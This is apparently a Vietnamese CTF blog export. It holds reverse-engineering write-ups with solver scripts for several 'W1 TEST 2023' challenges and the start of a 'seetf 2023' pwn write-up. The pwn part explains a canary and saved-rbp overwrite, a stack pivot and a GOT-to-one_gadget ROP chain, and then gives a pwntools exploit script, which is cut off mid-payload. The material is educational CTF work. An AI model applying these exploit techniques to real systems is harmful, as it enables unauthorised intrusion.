\u0026#34;invalid vault key!\u0026#34; .text:0000000000001507 mov rdi, rax ; s .text:000000000000150a call _puts .text:000000000000150f mov edi, 1 ; status .text:0000000000001514 call _exit cuối cùng chương trình sẽ lấy giá trị vừa được tính ở trên xor lại với idx và kiểm tra với từng kí tự tương ứng của mảng enc_flag trong chương trình.\nenc_flag\n.rodata:0000000000002020 public enc_flag .rodata:0000000000002020 enc_flag db 20h ; data xref: main+282↑o .rodata:0000000000002021 db 70h ; p .rodata:0000000000002022 db 57h ; w .rodata:0000000000002023 db 0 .rodata:0000000000002024 db 0 .rodata:0000000000002025 db 0 .rodata:0000000000002026 db 0 .rodata:0000000000002027 db 0 .rodata:0000000000002028 db 71h ; q .rodata:0000000000002029 db 20h .rodata:000000000000202a db 30h ; 0 .rodata:000000000000202b db 0 .rodata:000000000000202c db 0 .rodata:000000000000202d db 0 .rodata:000000000000202e db 0 .rodata:000000000000202f db 0 .rodata:0000000000002030 db 22h ; \u0026#34; .rodata:0000000000002031 db 70h ; p .rodata:0000000000002032 db 79h ; y .rodata:0000000000002033 db 0 .rodata:0000000000002034 db 0 .rodata:0000000000002035 db 0 .rodata:0000000000002036 db 0 .rodata:0000000000002037 db 0 .rodata:0000000000002038 db 73h ; s .rodata:0000000000002039 db 20h .rodata:000000000000203a db 61h ; a .rodata:000000000000203b db 0 .rodata:000000000000203c db 0 .rodata:000000000000203d db 0 .rodata:000000000000203e db 0 .rodata:000000000000203f db 0 .rodata:0000000000002040 db 24h ; $ .rodata:0000000000002041 db 70h ; p .rodata:0000000000002042 db 35h ; 5 .rodata:0000000000002043 db 0 .rodata:0000000000002044 db 0 .rodata:0000000000002045 db 0 .rodata:0000000000002046 db 0 .rodata:0000000000002047 db 0 .rodata:0000000000002048 db 75h ; u .rodata:0000000000002049 db 20h .rodata:000000000000204a db 71h ; q .rodata:000000000000204b db 0 .rodata:000000000000204c db 0 .rodata:000000000000204d db 0 .rodata:000000000000204e db 0 .rodata:000000000000204f db 0 .rodata:0000000000002050 db 26h ; \u0026amp; .rodata:0000000000002051 db 70h ; p .rodata:0000000000002052 db 59h ; y .rodata:0000000000002053 db 0 .rodata:0000000000002054 db 0 .rodata:0000000000002055 db 0 .rodata:0000000000002056 db 0 .rodata:0000000000002057 db 0 .rodata:0000000000002058 db 77h ; w .rodata:0000000000002059 db 20h .rodata:000000000000205a db 37h ; 7 .rodata:000000000000205b db 0 .rodata:000000000000205c db 0 .rodata:000000000000205d db 0 .rodata:000000000000205e db 0 .rodata:000000000000205f db 0 .rodata:0000000000002060 db 28h ; ( .rodata:0000000000002061 db 70h ; p .rodata:0000000000002062 db 78h ; x .rodata:0000000000002063 db 0 .rodata:0000000000002064 db 0 .rodata:0000000000002065 db 0 .rodata:0000000000002066 db 0 .rodata:0000000000002067 db 0 .rodata:0000000000002068 db 79h ; y .rodata:0000000000002069 db 20h .rodata:000000000000206a db 3ah ; : .rodata:000000000000206b db 0 .rodata:000000000000206c db 0 .rodata:000000000000206d db 0 .rodata:000000000000206e db 0 .rodata:000000000000206f db 0 .rodata:0000000000002070 db 2ah ; * .rodata:0000000000002071 db 70h ; p .rodata:0000000000002072 db 78h ; x .rodata:0000000000002073 db 0 .rodata:0000000000002074 db 0 .rodata:0000000000002075 db 0 .rodata:0000000000002076 db 0 .rodata:0000000000002077 db 0 .rodata:0000000000002078 db 7bh ; { .rodata:0000000000002079 db 20h .rodata:000000000000207a db 6ah ; j .rodata:000000000000207b db 0 .rodata:000000000000207c db 0 .rodata:000000000000207d db 0 .rodata:000000000000207e db 0 .rodata:000000000000207f db 0 .rodata:0000000000002080 db 2ch ; , .rodata:0000000000002081 db 70h ; p .rodata:0000000000002082 db 78h ; x .rodata:0000000000002083 db 0 .rodata:0000000000002084 db 0 .rodata:0000000000002085 db 0 .rodata:0000000000002086 db 0 .rodata:0000000000002087 db 0 .rodata:0000000000002088 db 7dh ; } .rodata:0000000000002089 db 20h .rodata:000000000000208a db 3ch ; \u0026lt; .rodata:000000000000208b db 0 .rodata:000000000000208c db 0 .rodata:000000000000208d db 0 .rodata:000000000000208e db 0 .rodata:000000000000208f db 0 .rodata:0000000000002090 db 2eh ; . .rodata:0000000000002091 db 70h ; p .rodata:0000000000002092 db 3eh ; \u0026gt; .rodata:0000000000002093 db 0 .rodata:0000000000002094 db 0 .rodata:0000000000002095 db 0 .rodata:0000000000002096 db 0 .rodata:0000000000002097 db 0 .rodata:0000000000002098 db 7fh ;  .rodata:0000000000002099 db 20h .rodata:000000000000209a db 61h ; a .rodata:000000000000209b db 0 .rodata:000000000000209c db 0 .rodata:000000000000209d db 0 .rodata:000000000000209e db 0 .rodata:000000000000209f db 0 .rodata:00000000000020a0 db 30h ; 0 .rodata:00000000000020a1 db 70h ; p .rodata:00000000000020a2 db 4fh ; o .rodata:00000000000020a3 db 0 .rodata:00000000000020a4 db 0 .rodata:00000000000020a5 db 0 .rodata:00000000000020a6 db 0 .rodata:00000000000020a7 db 0 .rodata:00000000000020a8 db 61h ; a .rodata:00000000000020a9 db 20h .rodata:00000000000020aa db 67h ; g .rodata:00000000000020ab db 0 .rodata:00000000000020ac db 0 .rodata:00000000000020ad db 0 .rodata:00000000000020ae db 0 .rodata:00000000000020af db 0 .rodata:00000000000020b0 db 32h ; 2 .rodata:00000000000020b1 db 70h ; p .rodata:00000000000020b2 db 73h ; s .rodata:00000000000020b3 db 0 .rodata:00000000000020b4 db 0 .rodata:00000000000020b5 db 0 .rodata:00000000000020b6 db 0 .rodata:00000000000020b7 db 0 .rodata:00000000000020b8 db 63h ; c .rodata:00000000000020b9 db 20h .rodata:00000000000020ba db 66h ; f .rodata:00000000000020bb db 0 .rodata:00000000000020bc db 0 .rodata:00000000000020bd db 0 .rodata:00000000000020be db 0 .rodata:00000000000020bf db 0 .rodata:00000000000020c0 db 34h ; 4 .rodata:00000000000020c1 db 70h ; p .rodata:00000000000020c2 db 78h ; x .rodata:00000000000020c3 db 0 .rodata:00000000000020c4 db 0 .rodata:00000000000020c5 db 0 .rodata:00000000000020c6 db 0 .rodata:00000000000020c7 db 0 .rodata:00000000000020c8 db 65h ; e .rodata:00000000000020c9 db 20h .rodata:00000000000020ca db 61h ; a .rodata:00000000000020cb db 0 .rodata:00000000000020cc db 0 .rodata:00000000000020cd db 0 .rodata:00000000000020ce db 0 .rodata:00000000000020cf db 0 .rodata:00000000000020d0 db 36h ; 6 .rodata:00000000000020d1 db 70h ; p .rodata:00000000000020d2 db 49h ; i .rodata:00000000000020d3 db 0 .rodata:00000000000020d4 db 0 .rodata:00000000000020d5 db 0 .rodata:00000000000020d6 db 0 .rodata:00000000000020d7 db 0 .rodata:00000000000020d8 db 67h ; g .rodata:00000000000020d9 db 20h .rodata:00000000000020da db 70h ; p .rodata:00000000000020db db 0 .rodata:00000000000020dc db 0 .rodata:00000000000020dd db 0 .rodata:00000000000020de db 0 .rodata:00000000000020df db 0 .rodata:00000000000020e0 db 38h ; 8 .rodata:00000000000020e1 db 70h ; p .rodata:00000000000020e2 db 77h ; w .rodata:00000000000020e3 db 0 .rodata:00000000000020e4 db 0 .rodata:00000000000020e5 db 0 .rodata:00000000000020e6 db 0 .rodata:00000000000020e7 db 0 .rodata:00000000000020e8 db 69h ; i .rodata:00000000000020e9 db 20h .rodata:00000000000020ea db 76h ; v .rodata:00000000000020eb db 0 .rodata:00000000000020ec db 0 .rodata:00000000000020ed db 0 .rodata:00000000000020ee db 0 .rodata:00000000000020ef db 0 .rodata:00000000000020f0 db 3ah ; : .rodata:00000000000020f1 db 70h ; p .rodata:00000000000020f2 db 7eh ; ~ .rodata:00000000000020f3 db 0 .rodata:00000000000020f4 db 0 .rodata:00000000000020f5 db 0 .rodata:00000000000020f6 db 0 .rodata:00000000000020f7 db 0 .rodata:00000000000020f8 db 6bh ; k .rodata:00000000000020f9 db 20h .rodata:00000000000020fa db 44h ; d .rodata:00000000000020fb db 0 .rodata:00000000000020fc db 0 .rodata:00000000000020fd db 0 .rodata:00000000000020fe db 0 .rodata:00000000000020ff db 0 .rodata:0000000000002100 db 3ch ; \u0026lt; .rodata:0000000000002101 db 70h ; p .rodata:0000000000002102 db 76h ; v .rodata:0000000000002103 db 0 .rodata:0000000000002104 db 0 .rodata:0000000000002105 db 0 .rodata:0000000000002106 db 0 .rodata:0000000000002107 db 0 .rodata:0000000000002108 db 6dh ; m .rodata:0000000000002109 db 20h .rodata:000000000000210a db 2dh ; - .rodata:000000000000210b db 0 .rodata:000000000000210c db 0 .rodata:000000000000210d db 0 .rodata:000000000000210e db 0 .rodata:000000000000210f db 0 .rodata:0000000000002110 db 3eh ; \u0026gt; .rodata:0000000000002111 db 70h ; p .rodata:0000000000002112 db 7ch ; | .rodata:0000000000002113 db 0 .rodata:0000000000002114 db 0 .rodata:0000000000002115 db 0 .rodata:0000000000002116 db 0 .rodata:0000000000002117 db 0 .rodata:0000000000002118 db 6fh ; o .rodata:0000000000002119 db 20h .rodata:000000000000211a db 62h ; b .rodata:000000000000211b db 0 .rodata:000000000000211c db 0 .rodata:000000000000211d db 0 .rodata:000000000000211e db 0 .rodata:000000000000211f db 0 mọi thứ đã rõ ràng, dưới đây là script cho bài toán này:\nvault.py\nimport base64 num = [0x577020,0x302071,0x797022,0x612073,0x357024,0x712075,0x597026,0x372077,0x787028,0x3a2079,0x78702a,0x6a207b,0x78702c,0x3c207d,0x3e702e,0x61207f,0x4f7030,0x672061,0x737032,0x662063,0x787034,0x612065,0x497036,0x702067,0x777038,0x762069,0x7e703a,0x44206b,0x76703c,0x2d206d,0x7c703e,0x62206f] flag = [] idx = 0 for key in num: if idx % 2 == 0: for x in range(256): if (((((x ^ idx) \u0026lt;\u0026lt; 0x10) ^ 0x7020) ^ idx) == key): flag.append(x) break else: for y in range(256): if (((((y ^ idx) \u0026lt;\u0026lt; 0x10) ^ 0x2070) ^ idx) == key): flag.append(y) break idx += 1 print(\u0026#39;\u0026#39;.join(chr(i) for i in flag)) -\u0026gt; flag: w1{b1t_0p3rat10n_vault_good_j0b}\n3. wanna-one intels description: wait what? the intel is empty?????\nchall file: wanna-one-intels\n╭─   ~/ctf/wannagame/chall  18:50:01 ─╮ ╰─❯ file wanna-one-intels ─╯ wanna-one-intels: elf 64-bit lsb executable, x86-64, version 1 (gnu/linux), statically linked, buildid[sha1]=4d076f0b0fa3a59f76928ddb65212898859409ff, for gnu/linux 3.2.0, not stripped vẫn là 1 file elf 64bit (không bị stripped), nhưng lúc mình kiểm tra hàm main, thì nó chỉ thực hiện return ?? vậy thì chương trình giấu số code còn lại ở đâu ????\n.text:0000000000401620 ; int __cdecl main(int argc, const char **argv, const char **envp) .text:0000000000401620 public main .text:0000000000401620 main proc near ; data xref: _start+18↓o .text:0000000000401620 ; __unwind { .text:0000000000401620 endbr64 .text:0000000000401624 xor eax, eax .text:0000000000401626 retn .text:0000000000401626 ; } // starts at 401620 .text:0000000000401626 main endp ban đầu, mình thấy hơi hoang mang, và vì đây là file binary dùng statically linked, nên mình khá lười trong việc tìm xem hàm nào ẩn giấu trong ida\nnên mình quyết định chạy file và có kết quả sau:\n╭─   ~/ctf/wannagame/chall  12:19:58 ─╮ ╰─❯ ./wanna-one-intels ─╯ ????? ồ, mặc nhiên hàm main chỉ xor eax, eax; ret mà lại có thể in ra được các kí tự đặc biệt như này, mình lấy làm lạ. mình nghi ngờ là ở hàm start hoặc exit khi chương trình bắt đầu hoặc kết thúc có những đoạn code ẩn để in các kí tự này\nđể chắc chắn, mình dùng gdb để debug và đặt breakpoint ở ret để kiểm tra\n► 0x401626 \u0026lt;main+6\u0026gt; ret \u0026lt;0x401b8a; __libc_start_call_main+106\u0026gt; ↓ 0x401b8a \u0026lt;__libc_start_call_main+106\u0026gt; mov edi, eax mình đã tới được ret và chưa có gì được in ra, mình lần theo hàm exit để xem thứ gì xảy ra. và mình đã phát hiện được 1 thứ đặc biệt\n► 0x40a7f0 \u0026lt;__run_exit_handlers\u0026gt; movabs rax, 0x101010101010101 0x40a7fa \u0026lt;__run_exit_handlers+10\u0026gt; push rax 0x40a7fb \u0026lt;__run_exit_handlers+11\u0026gt; movabs rax, 0x1010b3e3e3e3e3e 0x40a805 \u0026lt;__run_exit_handlers+21\u0026gt; xor qword ptr [rsp], rax 0x40a809 \u0026lt;__run_exit_handlers+25\u0026gt; mov rsi, rsp 0x40a80c \u0026lt;__run_exit_handlers+28\u0026gt; push 1 0x40a80e \u0026lt;__run_exit_handlers+30\u0026gt; pop rdi 0x40a80f \u0026lt;__run_exit_handlers+31\u0026gt; push 5 0x40a811 \u0026lt;__run_exit_handlers+33\u0026gt; pop rdx 0x40a812 \u0026lt;__run_exit_handlers+34\u0026gt; push 1 0x40a814 \u0026lt;__run_exit_handlers+36\u0026gt; pop rax 0x40a815 \u0026lt;__run_exit_handlers+37\u0026gt; syscall ở trong hàm __run_exit_handlers thật sự đã dùng các chỉ thị để in ra chuỗi kí tự ????, mình tiếp tục theo hàm này để xem có chuyện gì xảy ra\n-\u0026gt; cuối cùng, mình thấy hàm dùng 1 vòng lặp để thực hiện các phép toán và cứ giảm stack cho đến khi đầy đủ kí tự flag và tiếp tục kiểm tra trên stack thì mình thấy các kí tự của flag, sau đó chương trình gọi syscall exit để kết thúc\n00:0000│ rsp 0x7fffffffdd00 ◂— 0x747375637b3157b0 01:0008│ 0x7fffffffdd08 ◂— \u0026#39;0m_r0ut1n3s_w0w!}\u0026#39; 02:0010│ 0x7fffffffdd10 ◂— \u0026#39;n3s_w0w!}\u0026#39; 03:0018│ 0x7fffffffdd18 ◂— 0x7d /* \u0026#39;}\u0026#39; */ 04:0020│ rsi 0x7fffffffdd20 ◂— 0xa3f3f3f3f3f /* \u0026#39;?????\\n\u0026#39; */ get flag !\npwndbg\u0026gt; search \u0026#39;w1{\u0026#39; searching for value: \u0026#39;w1{\u0026#39; [stack] 0x7fffffffdd01 \u0026#39;w1{cust0m_r0ut1n3s_w0w!}\u0026#39; -\u0026gt; flag: w1{cust0m_r0ut1n3s_w0w!}\n4. pu pu flag checker description: i thought it really easy.\nchall file: flagchecker.html\nwelcome to pu pu flag checker input your flag, ex: w1{you_suck} [confirm] -\u0026gt; chương trình cho ta 1 file html, dường như là trang để check flag cổ điển, mình view source để xem chương trình chứa gì, thì thấy 1 dòng chứa những đoạn code có vẻ quen thuộc\n(function(_0x21262b,_0x48fc44){const _0x3d9bc6=_0x17ea,_0x1bc71f=_0x21262b();while(!![]){try{const _0x101b0c=parseint(_0x3d9bc6(0x92))/0x1+parseint(_0x3d9bc6(0x89))/0x2+-parseint(_0x3d9bc6(0x8d))/0x3+-parseint(_0x3d9bc6(0x87))/0x4*(-parseint(_0x3d9bc6(0x8f))/0x5)+parseint(_0x3d9bc6(0x94))/0x6+-parseint(_0x3d9bc6(0x84))/0x7+parseint(_0x3d9bc6(0x8e))/0x8*(parseint(_0x3d9bc6(0x90))/0x9);if(_0x101b0c===_0x48fc44)break;else _0x1bc71f[\u0026#39;push\u0026#39;](_0x1bc71f[\u0026#39;shift\u0026#39;]());}catch(_0x20c5ae){_0x1bc71f[\u0026#39;push\u0026#39;](_0x1bc71f[\u0026#39;shift\u0026#39;]());}}}(_0x16be,0xedeb9));function getrandomint(_0x35fac5,_0x501f88){const _0x4edb8c=_0x17ea;return math[_0x4edb8c(0x8a)](math[_0x4edb8c(0x96)]()*(_0x501f88-_0x35fac5+0x1))+_0x35fac5;}function bytearraytobase64(_0x458f88){const _0x2bd1a7=_0x17ea;let _0x148301=\u0026#39;\u0026#39;;for(let _0x5a2524=0x0;_0x5a2524\u0026lt;_0x458f88[_0x2bd1a7(0x8b)];_0x5a2524++){_0x148301+=string[_0x2bd1a7(0x95)](_0x458f88[_0x5a2524]);}const _0x123abd=btoa(_0x148301);return _0x123abd;}function _0x17ea(_0x1ef9b6,_0x14509b){const _0x16be78=_0x16be();return _0x17ea=function(_0x17eabc,_0x5afbf3){_0x17eabc=_0x17eabc-0x84;let _0xe824bb=_0x16be78[_0x17eabc];return _0xe824bb;},_0x17ea(_0x1ef9b6,_0x14509b);}function xorstrings(_0x5601ff,_0x11ecad){const _0x403f41=_0x17ea;let _0x3822c6=\u0026#39;\u0026#39;;for(let _0x304d5b=0x0;_0x304d5b\u0026lt;_0x5601ff[\u0026#39;length\u0026#39;]\u0026amp;\u0026amp;_0x304d5b\u0026lt;_0x11ecad[_0x403f41(0x8b)];_0x304d5b++){const _0x1a8e54=_0x5601ff[\u0026#39;charcodeat\u0026#39;](_0x304d5b),_0x51cc58=_0x11ecad[\u0026#39;charcodeat\u0026#39;](_0x304d5b),_0x1d436b=_0x1a8e54^_0x51cc58;_0x3822c6+=string[_0x403f41(0x95)](_0x1d436b);}return _0x3822c6;}function check(_0x3b37a2){const _0x452468=_0x17ea;var _0x41bc91=[0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x1,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x4,0xc7,0x23,0xc3,0x18,0x96,0x5,0x9a,0x7,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x9,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x0,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x2,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0xc,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0xb,0xdb,0xe0,0x32,0x3a,0xa,0x49,0x6,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x8,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x3,0xf6,0xe,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0xd,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0xf,0xb0,0x54,0xbb,0x16];if(_0x3b37a2[_0x452468(0x8b)]!=0x2c)return alert(\u0026#39;incorrect\\x20length!\u0026#39;);var _0x2884dc=[];for(let _0x1a57d6=0x0;_0x1a57d6\u0026lt;_0x3b37a2[_0x452468(0x8b)];_0x1a57d6++){_0x2884dc[_0x452468(0x91)](_0x3b37a2[_0x452468(0x85)](_0x1a57d6));}for(let _0xfc20f8=0x0;_0xfc20f8\u0026lt;0x10;_0xfc20f8++){for(let _0x4fadbc=0x0;_0x4fadbc\u0026lt;_0x3b37a2[_0x452468(0x8b)];_0x4fadbc++){_0x2884dc[_0x4fadbc]=_0x41bc91[_0x2884dc[_0x4fadbc]];}}var _0x45d93e=bytearraytobase64(_0x2884dc);console[_0x452468(0x86)](_0x45d93e);if(_0x45d93e!=_0x452468(0x88))return alert(_0x452468(0x93));return alert(_0x452468(0x8c));}function _0x16be(){const _0x4eae3d=[\u0026#39;1923945amreui\u0026#39;,\u0026#39;403288arwazc\u0026#39;,\u0026#39;522465drwojo\u0026#39;,\u0026#39;117auddxf\u0026#39;,\u0026#39;push\u0026#39;,\u0026#39;1266878gdassp\u0026#39;,\u0026#39;incorrect\\x20flag!\u0026#39;,\u0026#39;4091610cgcmne\u0026#39;,\u0026#39;fromcharcode\u0026#39;,\u0026#39;random\u0026#39;,\u0026#39;9597917yhchtu\u0026#39;,\u0026#39;charcodeat\u0026#39;,\u0026#39;log\u0026#39;,\u0026#39;12qpopiu\u0026#39;,\u0026#39;/52nxnad7lui+5g7idt7dbue0l7vkv/bdey779tzuwf7c5g7c5hbdzhswus=\u0026#39;,\u0026#39;138664skzbma\u0026#39;,\u0026#39;floor\u0026#39;,\u0026#39;length\u0026#39;,\u0026#39;good\\x20job,\\x20you\\x27re\\x20welcome!!\u0026#39;];_0x16be=function(){return _0x4eae3d;};return _0x16be();} -\u0026gt; javascript obfuscate\nvậy, mình tiến hành thả đoạn code trên vào tool deobfuscate này để deobfuscate đoạn code trên.\nmình nhận được output như sau:\npupu.js\nfunction getrandomint(min, max) { return math.floor(math.random() * (max - min + 1)) + min } function bytearraytobase64(data) { var value = \u0026#39;\u0026#39; var i = 0 for (; i \u0026lt; data.length; i++) { value = value + string.fromcharcode(data[i]) } var base64 = btoa(value) return base64 } function xorstrings(data, key) { var output = \u0026#39;\u0026#39; var i = 0 for (; i \u0026lt; data.length \u0026amp;\u0026amp; i \u0026lt; key.length; i++) { var $116 = data.charcodeat(i) var $y = key.charcodeat(i) var $118 = $116 ^ $y output = output + string.fromcharcode($118) } return output } function check(result) { var window = [ 99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118, 202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192, 183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21, 4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117, 9, 131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132, 83, 209, 0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207, 208, 239, 170, 251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168, 81, 163, 64, 143, 146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210, 205, 12, 19, 236, 95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115, 96, 129, 79, 220, 34, 42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219, 224, 50, 58, 10, 73, 6, 36, 92, 194, 211, 172, 98, 145, 149, 228, 121, 231, 200, 55, 109, 141, 213, 78, 169, 108, 86, 244, 234, 101, 122, 174, 8, 186, 120, 37, 46, 28, 166, 180, 198, 232, 221, 116, 31, 75, 189, 139, 138, 112, 62, 181, 102, 72, 3, 246, 14, 97, 53, 87, 185, 134, 193, 29, 158, 225, 248, 152, 17, 105, 217, 142, 148, 155, 30, 135, 233, 206, 85, 40, 223, 140, 161, 137, 13, 191, 230, 66, 104, 65, 153, 45, 15, 176, 84, 187, 22, ] if (result.length != 44) { return alert(\u0026#39;incorrect length!\u0026#39;) } var options = [] var key = 0 for (; key \u0026lt; result.length; key++) { options.push(result.charcodeat(key)) } var _0xfc20f8 = 0 for (; _0xfc20f8 \u0026lt; 16; _0xfc20f8++) { var i = 0 for (; i \u0026lt; result.length; i++) { options[i] = window[options[i]] } } var value = bytearraytobase64(options) console.log(value) if (value != \u0026#39;/52nxnad7lui+5g7idt7dbue0l7vkv/bdey779tzuwf7c5g7c5hbdzhswus=\u0026#39;) { return alert(\u0026#39;incorrect flag!\u0026#39;) } return alert(\u0026#34;good job, you\u0026#39;re welcome!!\u0026#34;) } mọi thứ có vẻ đã rõ ràng hơn ! tới đây, mảng chúng ta phải nhập vào phải có đúng 44 kí tự và sau đó được chuyển vào hàm check().\nchương trình thực hiện 1 vòng lặp 16 lần, qua mỗi lần cập nhật inputstring[j] = xorvalues[inputstring[j], mỗi vòng như vậy thay đổi 44 kí tự của inputstring\nsau khi kết thúc, chuyển string này về base64 và so sánh với chuỗi đã cho /52nxnad7lui+5g7idt7dbue0l7vkv/bdey779tzuwf7c5g7c5hbdzhswus=\n-\u0026gt; sau đây là script mình giải bài này:\npupu.py\nimport base64 key = [ 99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118, 202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192, 183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21, 4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117, 9, 131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132, 83, 209, 0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207, 208, 239, 170, 251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168, 81, 163, 64, 143, 146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210, 205, 12, 19, 236, 95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115, 96, 129, 79, 220, 34, 42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219, 224, 50, 58, 10, 73, 6, 36, 92, 194, 211, 172, 98, 145, 149, 228, 121, 231, 200, 55, 109, 141, 213, 78, 169, 108, 86, 244, 234, 101, 122, 174, 8, 186, 120, 37, 46, 28, 166, 180, 198, 232, 221, 116, 31, 75, 189, 139, 138, 112, 62, 181, 102, 72, 3, 246, 14, 97, 53, 87, 185, 134, 193, 29, 158, 225, 248, 152, 17, 105, 217, 142, 148, 155, 30, 135, 233, 206, 85, 40, 223, 140, 161, 137, 13, 191, 230, 66, 104, 65, 153, 45, 15, 176, 84, 187, 22, ] enc_flag = \u0026#39;/52nxnad7lui+5g7idt7dbue0l7vkv/bdey779tzuwf7c5g7c5hbdzhswus=\u0026#39; dec_flag = bytearray(base64.b64decode(enc_flag)) map={val: idx for idx, val in enumerate(key)} for _ in range(16): dec_flag = bytearray(map[byte] for byte in dec_flag) flag=bytes(dec_flag) print(flag.decode(\u0026#39;utf-8\u0026#39;)) -\u0026gt; flag: w1{nice_but_your_nightmare_has_just_started}\n","title":"W1 TEST 2023"},{"date":"2023-06-12","image":"","imageAlt":"","link":"https://w1n-gl0ry.github.io/posts/seetf/","summary":"Writeup","tags":["ctf","pwn"],"text":"seetf 2023 some challs in pwns category that i have solved author: lawliet from phis1ng_\ngreat - expectations description: ask no questions, and you'll be told no lies. ở bài này, trong hàm input_floats() có khai báo mảng buf kiểu char với (3 bytes), nhưng có lỗi khi format nhập vào là %f (4 bytes), nên từ 3 lần ghi đề cho, ta có thể đè nhiều nhất 3 bytes xuống canary (kí tự \u0026lsquo;a\u0026rsquo;) và 2 bytes của saved_rbp của hàm main. vì vậy, í tưởng ở đây là ta ghi đè 1 byte (hoặc 2 bytes) của saved_rbp để khiến cho ret trỏ tới chuỗi mà ta mong muốn. đầu chương trình cho ta nhập nhiều nhất 0x107 kí tự, nên ta có thể pivot stack đến đó, để khiến ret trỏ tới chuỗi payload mà ta muốn. để không phải leak libc rồi quay lại hàm main 1 lần nữa thì vì chúng ta có thể ghi đè lên bảng got nên ý tưởng của em là dùng rop để thay đổi địa chỉ của hàm nào đó về one_gadgets, vì offset giữa 2 hàm trong libc luôn cố định nên ta có thể dùng gadget add dword ptr [rbp - 0x3d], ebx ; nop ; ret để cộng/trừ offset sao cho địa chỉ đó trỏ tới one_gadget\nta thấy nửa byte đầu của bytes thứ 2 sau lsb của saved_rbp chỉ cách 1 đơn vị so với địa chỉ của buffer mà chương trình cho ta nhập vào. hơn nữa, byte cuối luôn kết thúc bằng 0x00, 0x10, \u0026hellip;, 0xf0 . nên ta có cơ hội 1/16 để pivot stack về buffer, xong cộng 1 để bypass check [rbp-1] với a.\nsolve scripts\n#!/usr/bin/env python3 from pwn import * import time import sys import struct local = 0 debug = 0 context.arch = \u0026#39;amd64\u0026#39; # context.aslr = false context.log_level = \u0026#39;debug\u0026#39; # context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;, \u0026#39;-f\u0026#39; \u0026#39;#{pane_pid}\u0026#39;, \u0026#39;-p\u0026#39;] # context.timeout = 2 def riconn(): global local global debug for arg in sys.argv[1:]: if arg in (\u0026#39;-l\u0026#39;, \u0026#39;--local\u0026#39;): local = 1 if arg in (\u0026#39;-d\u0026#39;, \u0026#39;--debug\u0026#39;): debug = 1 if local: io = process(\u0026#39;./chall_patched\u0026#39;) if debug: gdb.attach(s, gdbscript=\u0026#39;\u0026#39;\u0026#39; b* 0x00000000004012ae b* 0x00000000004011fc c \u0026#39;\u0026#39;\u0026#39;) else: pass else: io = remote(\u0026#39;win.the.seetf.sg\u0026#39;, 2004) return io elf = elf(\u0026#39;./chall_patched\u0026#39;) libc = elf(\u0026#39;libc.so.6\u0026#39;) pop_rdi = 0x0000000000401313 pop_rsi_r15 = 0x0000000000401311 leave_ret = 0x000000000040122c pop_rbp = 0x000000000040119d ret = 0x000000000040101a main = 0x000000000040122e main_no_push = main+1 input_floats = 0x00000000004011b6 put_gots = 0x404018 csu = 0x40130a add_what_where = 0x000000000040119c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret def hex_to_float(hex_str): binary_str = bytes.fromhex(hex_str) unpacked = struct.unpack(\u0026#39;!f\u0026#39;, binary_str) return unpacked[0] try: io = riconn() payload = 0x61*b\u0026#39;a\u0026#39; + 8*b\u0026#39;a\u0026#39; + p64(csu) + 